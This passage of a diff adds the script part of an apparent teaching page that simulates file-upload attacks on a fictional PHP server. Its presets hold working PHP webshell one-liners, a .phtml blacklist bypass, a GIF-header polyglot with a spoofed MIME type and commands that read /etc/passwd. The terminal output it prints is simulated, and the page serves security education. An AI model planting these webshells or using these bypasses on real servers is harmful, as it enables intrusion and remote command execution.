+      nameInput.value = 'avatar.png';
+      mimeSelect.value = 'image/png';
+      contentArea.value = '[Binary PNG Image: 1420 bytes of image bitmap data]';
+      cmdInput.value = 'id';
+      updateVerdict('safe', 'STAGE 1: LEGITIMATE IMAGE UPLOAD', 'Profile image safely uploaded to web directory.');
+    } else if (stage === 2) {
+      nameInput.value = 'shell.phtml';
+      mimeSelect.value = 'application/x-php';
+      contentArea.value = '<?php echo "Webshell active: " . shell_exec($_GET["cmd"]); ?>';
+      cmdInput.value = 'whoami';
+      updateVerdict('warning', 'STAGE 2: EXTENSION BLACKLIST BYPASS', 'Application filters ".php", but allows alternate executable extension ".phtml".');
+    } else if (stage === 3) {
+      nameInput.value = 'shell.php';
+      mimeSelect.value = 'image/jpeg';
+      contentArea.value = 'GIF89a; <?php system($_GET["cmd"]); ?>';
+      cmdInput.value = 'id; uname -a';
+      updateVerdict('danger', 'STAGE 3: POLYGLOT / MIME SPOOFING', 'Pretending to be image/jpeg while embedding PHP payload inside GIF header.');
+    } else if (stage === 4) {
+      nameInput.value = 'webshell.php';
+      mimeSelect.value = 'image/png';
+      contentArea.value = '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>';
+      cmdInput.value = 'id; whoami; uname -a; cat /etc/passwd';
+      updateVerdict('danger', 'STAGE 4: WEAPONIZED REMOTE CODE EXECUTION (RCE)', 'Direct web access to /uploads/webshell.php?cmd=... grants full OS command control.');
+    }
+  }
+
+  function updateVerdict(type, title, desc) {
+    const card = document.getElementById('verdict-card');
+    card.className = 'verdict-banner ' + type;
+    document.getElementById('verdict-title').innerHTML = `<span>${title}</span>`;
+    document.getElementById('verdict-desc').textContent = desc;
+  }
+
+  function fireUpload() {
+    const filename = document.getElementById('file-name').value.trim();
+    const mime = document.getElementById('mime-type').value;
+    const content = document.getElementById('file-content').value.trim();
+    const cmd = document.getElementById('cmd-input').value.trim();
+
+    const term = document.getElementById('terminal-content');
+    const uploadedItem = document.getElementById('uploaded-file-item');
+
+    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
+
+    if (currentStage === 1) {
+      term.innerHTML += `<br><span class="t-info">[${timestamp}] POST /upload.php multipart/form-data</span><br>` +
+        `<span style="color:#94a3b8;">Uploaded File:</span> <span class="t-cmd">${escapeHtml(filename)}</span> (${escapeHtml(mime)})<br>` +
+        `<span class="t-prompt">server@upload:~$</span> <span class="t-info">File validated: Image extension recognized (.png)</span><br>` +
+        `<span class="t-prompt">server@upload:~$</span> <span class="t-cmd">move_uploaded_file() -&gt; /var/www/html/uploads/${escapeHtml(filename)}</span><br>` +
+        `<span class="t-success">✔ File stored safely. Non-executable image content.</span><br>`;
+
+      uploadedItem.style.display = 'flex';
+      uploadedItem.className = 'file-item';
+      uploadedItem.innerHTML = `<span class="file-name">🖼️ ${escapeHtml(filename)}</span><span class="file-meta">rw-r--r-- | 14 KB</span>`;
+
+      updateVerdict('safe', '🛡️ SUCCESS: SAFE FILE UPLOAD', 'Image successfully stored in /uploads/. No execution possible.');
+    } else if (currentStage === 2) {
+      term.innerHTML += `<br><span class="t-info">[${timestamp}] POST /upload.php multipart/form-data</span><br>` +
+        `<span style="color:#94a3b8;">Uploaded File:</span> <span class="t-highlight">${escapeHtml(filename)}</span><br>` +
+        `<span class="t-prompt">server@upload:~$</span> <span class="t-err">Blacklist check for ".php": PASSED! (".phtml" was overlooked)</span><br>` +
+        `<span class="t-prompt">server@upload:~$</span> <span class="t-cmd">Saved to /var/www/html/uploads/${escapeHtml(filename)}</span><br>` +
+        `<span class="t-prompt">server@upload:~$</span> <span class="t-highlight">Apache mime-type handler maps .phtml to application/x-httpd-php!</span><br>` +
+        `<span class="t-success">⚠️ Webshell successfully accessible at /uploads/${escapeHtml(filename)}</span><br>`;
+
+      uploadedItem.style.display = 'flex';
+      uploadedItem.className = 'file-item danger-file';
+      uploadedItem.innerHTML = `<span class="file-name">💀 ${escapeHtml(filename)}</span><span class="file-meta" style="color:#f87171;">rwxr-xr-x | EXECUTABLE</span>`;
+
+      updateVerdict('warning', '⚠️ EXTENSION BLACKLIST BYPASSED', 'Apache configured to treat .phtml as PHP. Webshell is now live on the server!');
+    } else if (currentStage === 3) {
+      term.innerHTML += `<br><span class="t-info">[${timestamp}] POST /upload.php multipart/form-data</span><br>` +
+        `<span style="color:#94a3b8;">Uploaded File:</span> <span class="t-highlight">${escapeHtml(filename)}</span><br>` +
+        `<span style="color:#94a3b8;">Client MIME Header:</span> <span class="t-info">${escapeHtml(mime)}</span> (Spoofed!)<br>` +
+        `<span class="t-prompt">server@upload:~$</span> <span class="t-err">Server checked Content-Type header only: PASSED!</span><br>` +
+        `<span class="t-prompt">server@upload:~$</span> <span class="t-cmd">Stored at /var/www/html/uploads/${escapeHtml(filename)}</span><br>` +
+        `<span class="t-success">🔥 Polyglot script uploaded and ready for execution!</span><br>`;
+
+      uploadedItem.style.display = 'flex';
+      uploadedItem.className = 'file-item danger-file';
+      uploadedItem.innerHTML = `<span class="file-name">💀 ${escapeHtml(filename)}</span><span class="file-meta" style="color:#f87171;">rwxr-xr-x | EXECUTABLE</span>`;
+
+      updateVerdict('danger', '🔥 WEBSHELL DEPLOYED (MIME SPOOFED)', 'Header-only check was fooled by image/jpeg. The .php webshell is directly accessible via HTTP GET.');
+    } else if (currentStage === 4) {
+      term.innerHTML += `<br><span class="t-info">[${timestamp}] Triggering Webshell: GET /uploads/${escapeHtml(filename)}?cmd=${escapeHtml(cmd)}</span><br>` +
+        `<span class="t-prompt">www-data@apex-web-01:~$</span> <span class="t-cmd">${escapeHtml(cmd)}</span><br>` +
+        `<span class="t-highlight">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br>` +
+        `<span style="color:#38bdf8;">Linux apex-web-01 5.15.0-101-generic x86_64 GNU/Linux</span><br>` +
+        `<span class="t-highlight">root:x:0:0:root:/root:/bin/bash</span><br>` +
+        `<span class="t-highlight">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br>` +
+        `<span class="t-success">💀 CRITICAL: FULL REMOTE CODE EXECUTION ESTABLISHED!</span><br>`;
+
+      uploadedItem.style.display = 'flex';
+      uploadedItem.className = 'file-item danger-file';
+      uploadedItem.innerHTML = `<span class="file-name">💀 ${escapeHtml(filename)}</span><span class="file-meta" style="color:#f87171;">ACTIVE WEBSHELL</span>`;
+
+      updateVerdict('danger', '💀 CRITICAL COMPROMISE: REMOTE CODE EXECUTION (RCE)', 'Direct arbitrary command execution confirmed! Attacker has achieved full shell access over the web server.');
+    }
+
+    term.scrollTop = term.scrollHeight;
+  }
+
+  function escapeHtml(str) {
+    return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
+  }
+
+  function resetLab() {
+    applyPreset(1);
+    document.getElementById('terminal-content').innerHTML = 
+      `<span class="t-info">// ApexPortal Apache/2.4 (PHP 8.1 Engine)</span><br>` +
+      `<span class="t-info">// Web Root: /var/www/html/ | Upload Directory: /var/www/html/uploads/</span><br><br>` +
+      `<span class="t-prompt">www-data@apex-web-01:~$</span> <span class="t-cmd">watch -n 1 ls -la /var/www/html/uploads/</span><br>` +
+      `<span style="color:#64748b;">[Ready for incoming file uploads...]</span>`;
+    const uploadedItem = document.getElementById('uploaded-file-item');
+    uploadedItem.style.display = 'none';
+    uploadedItem.innerHTML = '';
+  }
+</script>
+
+</body>
+</html>
